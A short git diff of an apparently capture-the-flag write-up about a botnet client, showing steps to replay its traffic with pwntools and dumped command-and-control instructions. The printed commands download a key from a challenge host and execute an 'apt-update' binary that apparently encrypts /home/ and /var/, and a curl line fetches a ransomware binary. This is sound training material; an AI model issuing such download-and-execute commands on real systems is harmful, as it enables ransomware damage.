@@ -12,6 +12,7 @@ Good luck!
 
 - run the client `./botnet_client -ip '78.128.216.92' -p 20210` and inspect the communication in `wireshark`
 - it seems that client send the same message to server, so lets try to reply it and decode the server responses
+
 ```python
 #!/usr/bin/env python3
 from pwn import *
@@ -39,7 +40,9 @@ download;;http://challenges.thecatch.cz:20102/key1984.RV20;;/tmp/key
 execute;;/tmp/apt-update -k /tmp/key -p /home/
 execute;;/tmp/apt-update -k /tmp/key -p /var/
 ```
+
 - check dumped links for flag
+
 ```bash
 curl http://challenges.thecatch.cz:20102/ransomvid1984.bin
 ```
